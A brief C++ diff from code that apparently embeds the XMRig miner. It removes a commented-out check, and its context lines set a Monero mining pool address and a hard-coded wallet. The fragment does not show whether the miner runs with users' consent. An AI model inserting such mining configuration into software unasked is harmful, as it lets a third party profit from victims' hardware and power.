@@ -75,10 +75,6 @@ public:
             std::cerr << "Failed to create Config object." << std::endl;
         }
 
-//        if (defaultConfig->m_pools == nullptr) {
-//            std::cerr << "Pools object is not initialized." << std::endl;
-//        }
-
         xmrig::Pool pool;
         pool.setUrl("pool.xmr.pt:3333");
         pool.setUser("481dqAWdnN7cQGE7gn5mzuHNRMwkyArJQJBu8Fg38CCf74ivJXQUUVo6HE6Fr4LNGN6yZTVRVGuw8eykZ4Jby3sWKb9k1qK");
